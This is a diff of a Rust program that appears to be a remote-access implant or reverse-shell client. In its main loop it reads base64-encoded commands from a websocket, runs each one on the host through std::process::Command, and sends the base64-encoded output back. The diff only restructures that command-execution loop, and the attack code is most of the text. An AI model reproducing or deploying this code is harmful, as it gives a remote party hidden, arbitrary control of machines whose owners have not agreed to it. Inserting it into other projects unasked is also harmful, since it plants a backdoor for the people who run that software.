@@ -3,41 +3,6 @@ use base64::prelude::*;
 use rand::Rng;
 use std::process::{Command, Stdio};
 
-
-// run command will change for windows. 
-// i think all we need to do for windows is change inital command to cmd
-fn run(cmmd : String) -> String {
-    
-    // run the passed command and get output
-    let mut cmmd = cmmd.split(" ").collect::<Vec<&str>>();
-    
-    if cmmd.len() == 0 {
-        return String::from("No command given");
-    }
-
-    println!("{:?}", cmmd);
-
-    // replace command with cmd to run in windows
-    let output = Command::new(cmmd.remove(0))
-        .stdout(Stdio::piped())
-        .args(cmmd)
-        .spawn();
-    
-    if output.is_err() {
-        return String::from("Command failed to execute on output");
-    }
-    
-    let output = output.expect("command failed to execute");
-
-    let status = output.wait_with_output();
-
-    if status.is_err() {
-        return String::from("Command Failed to execute on status"); 
-    }
-   
-    return String::from_utf8(status.unwrap().stdout).unwrap();
-}
-
 fn encode(inp : String) -> String {
     // base 64 encode 
     let inp = BASE64_STANDARD.encode(inp.into_bytes());
@@ -74,9 +39,40 @@ fn main() {
     loop {
         let msg = &socket.read().expect("Error reading message");        
         let cmmd = decode((msg.to_text().unwrap()).to_string());
-        let output = run(cmmd);
+
+        // run the passed command and get output
+        let mut cmmd = cmmd.split(" ").collect::<Vec<&str>>();
+        
+        if cmmd.len() == 0 {
+            continue; 
+        }
+
+        println!("{:?}", cmmd);
+
+        // replace command with cmd to run in windows
+        let output = Command::new(cmmd.remove(0))
+            .stdout(Stdio::piped())
+            .args(cmmd)
+            .spawn();
+        
+        if output.is_err() {
+            continue; 
+        }
+        
+        let output = output.expect("command failed to execute");
+
+        let status = output.wait_with_output();
+
+        if status.is_err() {
+            continue; 
+        }
+       
+        let output = String::from_utf8(status.unwrap().stdout).unwrap();
+
         socket.send(Message::text(encode(output).as_str())).unwrap();
     }
 
 }
+
+
 
